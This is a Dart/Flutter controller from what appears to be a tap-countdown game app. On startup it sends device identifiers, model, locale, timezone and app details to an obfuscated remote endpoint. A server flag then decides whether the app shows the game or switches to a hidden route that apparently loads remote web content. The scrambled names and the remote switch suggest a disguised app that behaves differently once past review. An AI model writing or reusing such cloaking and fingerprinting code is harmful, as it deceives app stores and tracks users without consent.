import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class CountdownTapMainLogic extends GetxController {

  var empubtvchx = RxBool(false);
  var qjvesafliw = RxBool(true);
  var onjpvu = RxString("");
  var treva = RxBool(false);
  var fisher = RxBool(true);
  final haozjl = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    hevlxk();
  }


  Future<void> hevlxk() async {
    treva.value = true;
    fisher.value = true;
    qjvesafliw.value = false;

    haozjl.post("https://d293c8yaw18nl2.cloudfront.net/uvgbskxmdrjfczinqeothlapwy",data: await ysjqoe()).then((value) {
      var whqgydp = value.data["whqgydp"] as String;
      var shjnavb = value.data["shjnavb"] as bool;
      if (shjnavb) {
        onjpvu.value = whqgydp;
        kamille();
      } else {
        greenfelder();
      }
    }).catchError((e) {
      qjvesafliw.value = true;
      fisher.value = true;
      treva.value = false;
    });
  }

  Future<Map<String, dynamic>> ysjqoe() async {
    final DeviceInfoPlugin snweh = DeviceInfoPlugin();
    PackageInfo ldotugwv_ntzhfi = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var tgmlbzoe = Platform.localeName;
    var hs_zXDGZ = currentTimeZone;

    var hs_Bk = ldotugwv_ntzhfi.packageName;
    var hs_rSxfv = ldotugwv_ntzhfi.version;
    var hs_TCXbOB = ldotugwv_ntzhfi.buildNumber;

    var hs_Qc = ldotugwv_ntzhfi.appName;
    var hs_qm = "";
    var hs_buxG  = "";
    var hs_OrMgD = "";
    var chaseRyan = "";
    var darwinKiehn = "";
    var chayaRodriguez = "";
    var amyaJohns = "";
    var elseStrosin = "";
    var treverHauck = "";
    var rexRohan = "";


    var hs_ezU = "";
    var hs_LIZjkFCQ = false;

    if (GetPlatform.isAndroid) {
      hs_ezU = "android";
      var fshdjib = await snweh.androidInfo;

      hs_OrMgD = fshdjib.brand;

      hs_qm  = fshdjib.model;
      hs_buxG = fshdjib.id;

      hs_LIZjkFCQ = fshdjib.isPhysicalDevice;
    }
    hs_LIZjkFCQ = true;
    if (GetPlatform.isIOS) {
      hs_ezU = "ios";
      var ifuczdokj = await snweh.iosInfo;
      hs_OrMgD = ifuczdokj.name;
      hs_qm = ifuczdokj.model;

      hs_buxG = ifuczdokj.identifierForVendor ?? "";
      hs_LIZjkFCQ  = ifuczdokj.isPhysicalDevice;
    }
    var res = {
      "hs_Qc": hs_Qc,
      "hs_TCXbOB": hs_TCXbOB,
      "hs_Bk": hs_Bk,
      "chayaRodriguez" : chayaRodriguez,
      "hs_qm": hs_qm,
      "hs_zXDGZ": hs_zXDGZ,
      "hs_OrMgD": hs_OrMgD,
      "tgmlbzoe": tgmlbzoe,
      "hs_ezU": hs_ezU,
      "treverHauck" : treverHauck,
      "hs_LIZjkFCQ": hs_LIZjkFCQ,
      "hs_rSxfv": hs_rSxfv,
      "chaseRyan" : chaseRyan,
      "hs_buxG": hs_buxG,
      "darwinKiehn" : darwinKiehn,
      "amyaJohns" : amyaJohns,
      "elseStrosin" : elseStrosin,
      "rexRohan" : rexRohan,

    };
    return res;
  }

  Future<void> greenfelder() async {
    Get.offNamed("/countdown_tap_game");
  }

  Future<void> kamille() async {
    Get.offNamed("/tap_history_sore");
  }

}
